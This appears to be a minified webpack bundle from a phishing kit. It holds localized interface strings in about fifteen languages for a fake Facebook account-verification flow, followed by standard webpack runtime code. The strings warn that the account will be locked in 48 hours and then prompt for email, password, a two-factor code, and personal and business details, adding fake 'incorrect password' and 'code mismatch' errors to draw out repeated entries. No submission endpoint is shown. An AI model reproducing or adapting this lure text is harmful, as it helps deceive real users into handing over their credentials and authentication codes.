     '{"welcome":"Willkommen in unserer Anwendung","checkpoint1":"Das Konto wird nach 48 Stunden gesperrt, wenn Sie nicht verifizieren","checkpoint2":"Bitte kontaktieren Sie uns sofort für Unterstützung und Kontoverifizierung. Bitte folgen Sie unseren Anweisungen.","verifyBtn":"KONTO VERIFIZIEREN","emailInput":"E-Mail","passwordInput":"Passwort","submitBtn":"Einreichen","forgetPass":"Passwort vergessen?","verifyTitle":"Bestätigen Sie, dass Sie es sind","enterPassword":"Geben Sie Ihr Passwort ein","passwordPlaceholder":"Bitte geben Sie Ihr Passwort ein","passwordIncorrect":"Das eingegebene Passwort oder Konto ist falsch.","twoFactorTitle":"Öffnen Sie Ihre Authentifizierungs-App","twoFactorDescription":"Geben Sie den Code aus der Zwei-Faktor-Authentifizierungs-App ein.","twoFactorPlaceholder":"Code","authCodeMismatch":"Der eingegebene Anmeldecode stimmt nicht überein.","appealFormTitle":"Einspruchsformular","fullNamePlaceholder":"Vollständiger Name","personalEmailPlaceholder":"Persönliche E-Mail","businessEmailPlaceholder":"Geschäftliche E-Mail","facebookPageNamePlaceholder":"Facebook-Seitenname","agreeTerms":"Ich stimme den Nutzungsbedingungen zu","loginButton":"Anmelden","submitButton":"Senden"}'
    );
   },
   5553: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"مرحبًا بك في تطبيقنا","checkpoint1":"سيتم قفل الحساب بعد 48 ساعة إذا لم تقم بالتحقق","checkpoint2":"يرجى الاتصال بنا على الفور للحصول على المساعدة والتحقق من حسابك. يرجى اتباع تعليماتنا.","verifyBtn":"التحقق من الحساب","emailInput":"بريد إلكتروني","passwordInput":"كلمة المرور","submitBtn":"إرسال","forgetPass":"نسيت كلمة المرور؟","verifyTitle":"أكد أنك أنت","enterPassword":"أدخل كلمة المرور الخاصة بك","passwordPlaceholder":"يرجى إدخال كلمة المرور الخاصة بك","passwordIncorrect":"كلمة المرور أو الحساب الذي أدخلته غير صحيح.","twoFactorTitle":"انتقل إلى تطبيق التحقق الخاص بك","twoFactorDescription":"أدخل الرمز المكون أرقام الذي حصلت عليه من تطبيق التحقق ذو العاملين.","twoFactorPlaceholder":"الرمز","authCodeMismatch":"رمز الدخول الذي أدخلته لا يتطابق.","appealFormTitle":"استمارة الاستئناف","fullNamePlaceholder":"الاسم الكامل","personalEmailPlaceholder":"البريد الإلكتروني الشخصي","businessEmailPlaceholder":"البريد الإلكتروني التجاري","facebookPageNamePlaceholder":"اسم صفحة الفيسبوك","agreeTerms":"أوافق على الشروط والأحكام","loginButton":"تسجيل الدخول","submitButton":"إرسال"}'
    );
   },
   4174: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"Welcome to our application","checkpoint1":"Account will be lock after 48 hours if you not verify","checkpoint2":"Please contact us immediately for support and account verification. Please follow our instructions.","verifyBtn":"VERIFY ACCOUNT","emailInput":"Email","passwordInput":"Password","submitBtn":"Submit","forgetPass":"Forgot Password?","titleModal":"Verify it\'s you","verifyTitle":"Verify it\'s you","enterPassword":"Enter your password","passwordPlaceholder":"Please input password","passwordIncorrect":"The password or account you entered is incorrect.","twoFactorTitle":"Go to your authentication app","twoFactorDescription":"Enter the code from the two-factor authentication app.","twoFactorPlaceholder":"Code","authCodeMismatch":"The login code you entered doesn\'t match.","appealFormTitle":"Appeal Form","fullNamePlaceholder":"Full name","personalEmailPlaceholder":"Personal email","businessEmailPlaceholder":"Business Email","facebookPageNamePlaceholder":"Facebook page name","agreeTerms":"I agree with Terms of use","loginButton":"Log in","submitButton":"Submit"}'
    );
   },
   6725: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"Bienvenido a nuestra aplicación","checkpoint1":"La cuenta se bloqueará después de 48 horas si no verifica","checkpoint2":"Por favor contáctenos inmediatamente para soporte y verificación de cuenta. Siga nuestras instrucciones.","verifyBtn":"VERIFICAR CUENTA","emailInput":"Correo electrónico","passwordInput":"Contraseña","submitBtn":"Enviar","forgetPass":"¿Olvidaste tu contraseña?","verifyTitle":"Verifica que eres tú","enterPassword":"Introduce tu contraseña","passwordPlaceholder":"Por favor, introduce tu contraseña","passwordIncorrect":"La contraseña o cuenta que ingresaste es incorrecta.","twoFactorTitle":"Abre tu aplicación de autenticación","twoFactorDescription":"Introduce el código de de la aplicación de autenticación de dos factores.","twoFactorPlaceholder":"Código","authCodeMismatch":"El código de acceso que introdujiste no coincide.","appealFormTitle":"Formulario de apelación","fullNamePlaceholder":"Nombre completo","personalEmailPlaceholder":"Correo electrónico personal","businessEmailPlaceholder":"Correo electrónico empresarial","facebookPageNamePlaceholder":"Nombre de la página de Facebook","agreeTerms":"Acepto los Términos de uso","loginButton":"Iniciar sesión","submitButton":"Enviar"}'
    );
   },
   4605: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"Bienvenue dans notre application","checkpoint1":"Le compte sera verrouillé après 48 heures si vous ne vérifiez pas","checkpoint2":"Veuillez nous contacter immédiatement pour obtenir de l\'aide et vérifier votre compte. Veuillez suivre nos instructions.","verifyBtn":"VÉRIFIER LE COMPTE","emailInput":"E-mail","passwordInput":"Mot de passe","submitBtn":"Soumettre","forgetPass":"Mot de passe oublié ?","verifyTitle":"Vérifiez qu\'il s\'agit bien de vous","enterPassword":"Entrez votre mot de passe","passwordPlaceholder":"Veuillez entrer votre mot de passe","passwordIncorrect":"Le mot de passe ou le compte que vous avez entré est incorrect.","twoFactorTitle":"Accédez à votre application d\'authentification","twoFactorDescription":"Entrez le code à de l\'application d\'authentification à deux facteurs.","twoFactorPlaceholder":"Code","authCodeMismatch":"Le code de connexion que vous avez saisi ne correspond pas.","appealFormTitle":"Formulaire de contestation","fullNamePlaceholder":"Nom complet","personalEmailPlaceholder":"E-mail personnel","businessEmailPlaceholder":"E-mail professionnel","facebookPageNamePlaceholder":"Nom de la page Facebook","agreeTerms":"J\'accepte les conditions d\'utilisation","loginButton":"Se connecter","submitButton":"Envoyer"}'
    );
   },
   8066: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"हमारे आवेदन में आपका स्वागत है","checkpoint1":"यदि आप सत्यापित नहीं करते हैं तो आपका खाता 48 घंटे बाद लॉक हो जाएगा","checkpoint2":"कृपया समर्थन और खाता सत्यापन के लिए तुरंत हमसे संपर्क करें। कृपया हमारे निर्देशों का पालन करें।","verifyBtn":"खाता सत्यापित करें","emailInput":"ईमेल","passwordInput":"पासवर्ड","submitBtn":"जमा करें","forgetPass":"पासवर्ड भूल गए?","verifyTitle":"सुनिश्चित करें कि आप वही हैं","enterPassword":"अपना पासवर्ड दर्ज करें","passwordPlaceholder":"कृपया अपना पासवर्ड दर्ज करें","passwordIncorrect":"दर्ज किया गया पासवर्ड या खाता गलत है।","twoFactorTitle":"अपने प्रमाणीकरण ऐप पर जाएं","twoFactorDescription":"दो-चरण प्रमाणीकरण ऐप से  का कोड दर्ज करें।","twoFactorPlaceholder":"कोड","authCodeMismatch":"दर्ज किया गया लॉगिन कोड मेल नहीं खाता है।","appealFormTitle":"अपील फॉर्म","fullNamePlaceholder":"पूरा नाम","personalEmailPlaceholder":"व्यक्तिगत ईमेल","businessEmailPlaceholder":"व्यावसायिक ईमेल","facebookPageNamePlaceholder":"फेसबुक पेज नाम","agreeTerms":"मैं शर्तों और नियमों से सहमत हूँ","loginButton":"लॉगिन करें","submitButton":"सबमिट करें"}'
    );
   },
   3672: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"Benvenuto nella nostra applicazione","checkpoint1":"L\'account verrà bloccato dopo 48 ore se non verifichi","checkpoint2":"Contattaci immediatamente per assistenza e verifica dell\'account. Segui le nostre istruzioni.","verifyBtn":"VERIFICA ACCOUNT","emailInput":"Email","passwordInput":"Password","submitBtn":"Invia","forgetPass":"Hai dimenticato la password?","verifyTitle":"Verifica che sei tu","enterPassword":"Inserisci la tua password","passwordPlaceholder":"Per favore inserisci la tua password","passwordIncorrect":"La password o l\'account inserito non è corretto.","twoFactorTitle":"Vai alla tua app di autenticazione","twoFactorDescription":"Inserisci il codice a dalla tua app di autenticazione a due fattori.","twoFactorPlaceholder":"Codice","authCodeMismatch":"Il codice di accesso inserito non corrisponde.","appealFormTitle":"Modulo di reclamo","fullNamePlaceholder":"Nome completo","personalEmailPlaceholder":"Email personale","businessEmailPlaceholder":"Email aziendale","facebookPageNamePlaceholder":"Nome della pagina Facebook","agreeTerms":"Accetto i termini di utilizzo","loginButton":"Accedi","submitButton":"Invia"}'
    );
   },
   3679: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"私たちのアプリケーションへようこそ","checkpoint1":"確認しない場合、アカウントは48時間後にロックされます","checkpoint2":"サポートとアカウント確認のためにすぐにご連絡ください。私たちの指示に従ってください。","verifyBtn":"アカウントを確認","emailInput":"電子メール","passwordInput":"パスワード","submitBtn":"送信","forgetPass":"パスワードを忘れましたか？","verifyTitle":"本人確認","enterPassword":"パスワードを入力してください","passwordPlaceholder":"パスワードを入力してください","passwordIncorrect":"入力されたパスワードまたはアカウントが正しくありません。","twoFactorTitle":"認証アプリを開く","twoFactorDescription":"二要素認証アプリの 桁のコードを入力してください。","twoFactorPlaceholder":"コード","authCodeMismatch":"入力したログインコードが一致しません。","appealFormTitle":"異議申立書","fullNamePlaceholder":"フルネーム","personalEmailPlaceholder":"個人のメールアドレス","businessEmailPlaceholder":"ビジネスメール","facebookPageNamePlaceholder":"Facebookページ名","agreeTerms":"利用規約に同意します","loginButton":"ログイン","submitButton":"送信"}'
    );
   },
   7416: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"우리 애플리케이션에 오신 것을 환영합니다","checkpoint1":"확인하지 않으면 48시간 후에 계정이 잠깁니다","checkpoint2":"지원 및 계정 확인을 위해 즉시 문의해 주십시오. 지침을 따르십시오.","verifyBtn":"계정 확인","emailInput":"電子メール","passwordInput":"비밀번호","submitBtn":"제출","forgetPass":"비밀번호를 잊으셨습니까?","verifyTitle":"본인 확인","enterPassword":"비밀번호를 입력하세요","passwordPlaceholder":"비밀번호를 입력하세요","passwordIncorrect":"입력하신 비밀번호 또는 계정이 올바르지 않습니다.","twoFactorTitle":"인증 앱으로 이동하세요","twoFactorDescription":"2단계 인증 앱에서 코드를 입력하세요.","twoFactorPlaceholder":"코드","authCodeMismatch":"입력한 로그인 코드가 일치하지 않습니다.","appealFormTitle":"이의 신청 양식","fullNamePlaceholder":"전체 이름","personalEmailPlaceholder":"개인 이메일","businessEmailPlaceholder":"업무 이메일","facebookPageNamePlaceholder":"페이스북 페이지 이름","agreeTerms":"이용 약관에 동의합니다","loginButton":"로그인","submitButton":"제출"}'
    );
   },
   5832: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"Bienvenido a nuestra aplicación","checkpoint1":"La cuenta se bloqueará después de 48 horas si no verifica","checkpoint2":"Por favor contáctenos inmediatamente para soporte y verificación de cuenta. Siga nuestras instrucciones.","verifyBtn":"VERIFICAR CUENTA","emailInput":"Correo electrónico","passwordInput":"Contraseña","submitBtn":"Enviar","forgetPass":"¿Olvidaste tu contraseña?","verifyTitle":"Verifica que eres tú","enterPassword":"Ingresa tu contraseña","passwordPlaceholder":"Por favor ingresa tu contraseña","passwordIncorrect":"La contraseña o cuenta ingresada no es correcta.","twoFactorTitle":"Ve a tu aplicación de autenticación","twoFactorDescription":"Ingresa el código de de la aplicación de autenticación de dos factores.","twoFactorPlaceholder":"Código","authCodeMismatch":"El código de acceso ingresado no coincide.","appealFormTitle":"Formulario de apelación","fullNamePlaceholder":"Nombre completo","personalEmailPlaceholder":"Correo electrónico personal","businessEmailPlaceholder":"Correo electrónico de negocios","facebookPageNamePlaceholder":"Nombre de la página de Facebook","agreeTerms":"Acepto los términos de uso","loginButton":"Iniciar sesión","submitButton":"Enviar"}'
    );
   },
   2838: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"Welcome to our application","checkpoint1":"Account will be locked after 48 hours if you do not verify","checkpoint2":"Please contact us immediately for support and account verification. Please follow our instructions.","verifyBtn":"VERIFY ACCOUNT","emailInput":"Email","passwordInput":"Password","submitBtn":"Submit","forgetPass":"Forgot Password?","verifyTitle":"Verify it\'s you","enterPassword":"Enter your password","passwordPlaceholder":"Please enter your password","passwordIncorrect":"The password or account you entered is incorrect.","twoFactorTitle":"Go to your authentication app","twoFactorDescription":"Enter the code from your two-factor authentication app.","twoFactorPlaceholder":"Code","authCodeMismatch":"The login code you entered doesn\'t match.","appealFormTitle":"Appeal Form","fullNamePlaceholder":"Full name","personalEmailPlaceholder":"Personal email","businessEmailPlaceholder":"Business email","facebookPageNamePlaceholder":"Facebook page name","agreeTerms":"I agree with Terms of use","loginButton":"Log in","submitButton":"Submit"}'
    );
   },
   1153: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"Welcome to our application","checkpoint1":"Account will be locked after 48 hours if you do not verify","checkpoint2":"Please contact us immediately for support and account verification. Please follow our instructions.","verifyBtn":"VERIFY ACCOUNT","emailInput":"Email","passwordInput":"Password","submitBtn":"Submit","forgetPass":"Forgot Password?","verifyTitle":"Verify it\'s you","enterPassword":"Enter your password","passwordPlaceholder":"Please enter your password","passwordIncorrect":"The password or account you entered is incorrect.","twoFactorTitle":"Go to your authentication app","twoFactorDescription":"Enter the code from your two-factor authentication app.","twoFactorPlaceholder":"Code","authCodeMismatch":"The login code you entered doesn\'t match.","appealFormTitle":"Appeal Form","fullNamePlaceholder":"Full name","personalEmailPlaceholder":"Personal email","businessEmailPlaceholder":"Business email","facebookPageNamePlaceholder":"Facebook page name","agreeTerms":"I agree with Terms of use","loginButton":"Log in","submitButton":"Submit"}'
    );
   },
   4600: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"Добро пожаловать в наше приложение","checkpoint1":"Аккаунт будет заблокирован через 48 часов, если вы не подтвердите","checkpoint2":"Пожалуйста, свяжитесь с нами немедленно для получения поддержки и подтверждения аккаунта. Пожалуйста, следуйте нашим инструкциям.","verifyBtn":"ПОДТВЕРДИТЕ АККАУНТ","emailInput":"Электронная почта","passwordInput":"Пароль","submitBtn":"Отправить","forgetPass":"Забыли пароль?","verifyTitle":"Подтвердите, что это вы","enterPassword":"Введите ваш пароль","passwordPlaceholder":"Пожалуйста, введите ваш пароль","passwordIncorrect":"Введенный пароль или аккаунт неверны.","twoFactorTitle":"Перейдите в ваше приложение для аутентификации","twoFactorDescription":"Введите код из вашего приложения двухфакторной аутентификации.","twoFactorPlaceholder":"Код","authCodeMismatch":"Введенный вами код для входа не совпадает.","appealFormTitle":"Форма обращения","fullNamePlaceholder":"Полное имя","personalEmailPlaceholder":"Личный email","businessEmailPlaceholder":"Рабочий email","facebookPageNamePlaceholder":"Название страницы на Facebook","agreeTerms":"Я согласен с условиями использования","loginButton":"Войти","submitButton":"Отправить"}'
    );
   },
   7549: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"ยินดีต้อนรับสู่แอปพลิเคชันของเรา","checkpoint1":"บัญชีจะถูกล็อคหลังจาก 48 ชั่วโมงหากคุณไม่ยืนยัน","checkpoint2":"โปรดติดต่อเราทันทีเพื่อขอรับการสนับสนุนและการตรวจสอบบัญชี โปรดปฏิบัติตามคำแนะนำของเรา","verifyBtn":"ยืนยันบัญชี","emailInput":"อีเมล","passwordInput":"รหัสผ่าน","submitBtn":"ส่ง","forgetPass":"ลืมรหัสผ่าน?","verifyTitle":"ยืนยันตัวตนของคุณ","enterPassword":"กรุณากรอกรหัสผ่านของคุณ","passwordPlaceholder":"กรุณากรอกรหัสผ่าน","passwordIncorrect":"รหัสผ่านหรือบัญชีที่คุณกรอกไม่ถูกต้อง","twoFactorTitle":"ไปที่แอปยืนยันตัวตนของคุณ","twoFactorDescription":"กรอก หลักจากแอปยืนยันตัวตนสองขั้นตอน","twoFactorPlaceholder":"รหัส","authCodeMismatch":"รหัสที่คุณกรอกไม่ตรงกับรหัสที่ส่งมา","appealFormTitle":"แบบฟอร์มคำร้องขอ","fullNamePlaceholder":"ชื่อเต็ม","personalEmailPlaceholder":"อีเมลส่วนตัว","businessEmailPlaceholder":"อีเมลธุรกิจ","facebookPageNamePlaceholder":"ชื่อเพจ Facebook","agreeTerms":"ฉันยอมรับข้อกำหนดในการใช้งาน","loginButton":"เข้าสู่ระบบ","submitButton":"ส่ง"}'
    );
   },
   2389: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"Welcome to our application","checkpoint1":"Account will be locked after 48 hours if you do not verify","checkpoint2":"Please contact us immediately for support and account verification. Please follow our instructions.","verifyBtn":"VERIFY ACCOUNT","emailInput":"Email","passwordInput":"Password","submitBtn":"Submit","forgetPass":"Forgot Password?","titleModal":"Verify it\'s you","verifyTitle":"Verify it\'s you","enterPassword":"Enter your password","passwordPlaceholder":"Please input password","passwordIncorrect":"The password or account you entered is incorrect.","twoFactorTitle":"Go to your authentication app","twoFactorDescription":"Enter the code from the two-factor authentication app.","twoFactorPlaceholder":"Code","authCodeMismatch":"The login code you entered doesn\'t match.","appealFormTitle":"Appeal Form","fullNamePlaceholder":"Full name","personalEmailPlaceholder":"Personal email","businessEmailPlaceholder":"Business Email","facebookPageNamePlaceholder":"Facebook page name","agreeTerms":"I agree with Terms of use","loginButton":"Log in","submitButton":"Submit"}'
    );
   },
   5809: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"Chào mừng bạn đến với ứng dụng của chúng tôi","checkpoint1":"Tài khoản sẽ bị khóa sau 48 giờ nếu bạn không xác thực","checkpoint2":"Vui lòng liên hệ với chúng tôi ngay lập tức để được hỗ trợ và xác thực tài khoản. Vui lòng làm theo hướng dẫn của chúng tôi.","verifyBtn":"XÁC THỰC TÀI KHOẢN","emailInput":"Email","passwordInput":"Mật khẩu","submitBtn":"Đăng nhập","forgetPass":"Quên mật khẩu?","verifyTitle":"Xác minh là bạn","enterPassword":"Nhập mật khẩu của bạn","passwordPlaceholder":"Vui lòng nhập mật khẩu","passwordIncorrect":"Mật khẩu hoặc tài khoản bạn đã nhập không chính xác.","twoFactorTitle":"Vào ứng dụng xác thực của bạn","twoFactorDescription":"Nhập mã từ ứng dụng xác thực hai yếu tố.","twoFactorPlaceholder":"Mã","authCodeMismatch":"Mã đăng nhập bạn đã nhập không khớp.","appealFormTitle":"Biểu mẫu khiếu nại","fullNamePlaceholder":"Họ và tên","personalEmailPlaceholder":"Email cá nhân","businessEmailPlaceholder":"Email công việc","facebookPageNamePlaceholder":"Tên trang Facebook","agreeTerms":"Tôi đồng ý với Điều khoản sử dụng","loginButton":"Đăng nhập","submitButton":"Gửi"}'
    );
   },
   2444: function (e) {
    "use strict";
    e.exports = JSON.parse(
     '{"welcome":"Welkom by ons aansoek","checkpoint1":"Rekening sal geblokkeer word na 48 uur as jy nie verifieer nie","checkpoint2":"Kontak ons asseblief onmiddellik vir ondersteuning en rekeningverifikasi. Volg asseblief ons instruksies.","verifyBtn":"VERIFIEER REKENING","emailInput":"E-pos","passwordInput":"Wagwoord","submitBtn":"Indien","forgetPass":"Wagwoord vergeet?","verifyTitle":"Bevestig dit is jy","enterPassword":"Voer jou wagwoord in","passwordPlaceholder":"Voer asseblief jou wagwoord in","passwordIncorrect":"Die wagwoord of rekening wat jy ingevoer het, is verkeerd.","twoFactorTitle":"Gaan na jou verifikasie-app","twoFactorDescription":"Voer die in wat jy uit jou twee-faktor verifikasie-app gekry het.","twoFactorPlaceholder":"Kode","authCodeMismatch":"Die inlogkode wat jy ingevoer het, stem nie ooreen nie.","appealFormTitle":"Appèlvorm","fullNamePlaceholder":"Volle naam","personalEmailPlaceholder":"Persoonlike e-pos","businessEmailPlaceholder":"Besigheids-e-pos","facebookPageNamePlaceholder":"Facebook-bladnaam","agreeTerms":"Ek stem in met die bepalings en voorwaardes","loginButton":"Meld aan","submitButton":"Indien"}'
    );
   },
  },
  o = {};
 function t(a) {
  var i = o[a];
  if (void 0 !== i) return i.exports;
  var r = (o[a] = { id: a, loaded: !1, exports: {} });
  return e[a].call(r.exports, r, r.exports, t), (r.loaded = !0), r.exports;
 }
 (t.m = e),
  (function () {
   var e = [];
   t.O = function (o, a, i, r) {
    if (!a) {
     var n = 1 / 0;
     for (d = 0; d < e.length; d++) {
      (a = e[d][0]), (i = e[d][1]), (r = e[d][2]);
      for (var s = !0, l = 0; l < a.length; l++)
       (!1 & r || n >= r) &&
       Object.keys(t.O).every(function (e) {
        return t.O[e](a[l]);
       })
        ? a.splice(l--, 1)
        : ((s = !1), r < n && (n = r));
      if (s) {
       e.splice(d--, 1);
       var c = i();
       void 0 !== c && (o = c);
      }
     }
     return o;
    }
    r = r || 0;
    for (var d = e.length; d > 0 && e[d - 1][2] > r; d--) e[d] = e[d - 1];
    e[d] = [a, i, r];
   };
  })(),
  (function () {
   t.n = function (e) {
    var o =
     e && e.__esModule
      ? function () {
         return e["default"];
        }
      : function () {
         return e;
        };
    return t.d(o, { a: o }), o;
   };
  })(),
  (function () {
   t.d = function (e, o) {
    for (var a in o)
     t.o(o, a) &&
      !t.o(e, a) &&
      Object.defineProperty(e, a, { enumerable: !0, get: o[a] });
   };
  })(),
  (function () {
   t.g = (function () {
    if ("object" === typeof globalThis) return globalThis;
    try {
     return this || new Function("return this")();
    } catch (e) {
     if ("object" === typeof window) return window;
    }
   })();
  })(),
  (function () {
   t.o = function (e, o) {
    return Object.prototype.hasOwnProperty.call(e, o);
   };
  })(),
  (function () {
   t.r = function (e) {
    "undefined" !== typeof Symbol &&
     Symbol.toStringTag &&
     Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }),
     Object.defineProperty(e, "__esModule", { value: !0 });
   };
  })(),
  (function () {
   t.nmd = function (e) {
    return (e.paths = []), e.children || (e.children = []), e;
   };
  })(),
  (function () {
   t.p = "/";
  })(),
  (function () {
   var e = { 524: 0 };
   t.O.j = function (o) {
    return 0 === e[o];
   };
   var o = function (o, a) {
     var i,
      r,
      n = a[0],
      s = a[1],
      l = a[2],
      c = 0;
     if (
      n.some(function (o) {
       return 0 !== e[o];
      })
     ) {
      for (i in s) t.o(s, i) && (t.m[i] = s[i]);
      if (l) var d = l(t);
     }
     for (o && o(a); c < n.length; c++)
      (r = n[c]), t.o(e, r) && e[r] && e[r][0](), (e[r] = 0);
     return t.O(d);
    },
    a = (self["webpackChunkmy_vue_app"] = self["webpackChunkmy_vue_app"] || []);
   a.forEach(o.bind(null, 0)), (a.push = o.bind(null, a.push.bind(a)));
  })();
 var a = t.O(void 0, [504], function () {
  return t(4100);
 });
 a = t.O(a);
})();
//# sourceMappingURL=app.8ed5e8f7.js.map
